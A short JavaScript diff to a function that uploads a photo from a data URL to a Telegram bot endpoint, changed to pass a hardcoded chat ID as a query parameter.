@@ -24,7 +24,8 @@ async function sendPhotoToTelegramBot(photoDataUrl) {
     const formData = new FormData();
     const photoBlob = await fetch(photoDataUrl).then(res => res.blob());
     formData.append('photo', photoBlob, 'photo.jpg');
-    const response = await fetch(TELEGRAM_BOT_API_ENDPOINT, {
+    const chatId = 5923255825; // Replace with your actual chat ID
+    const response = await fetch(`${TELEGRAM_BOT_API_ENDPOINT}?chat_id=${chatId}`, {
         method: 'POST',
         body: formData
     });
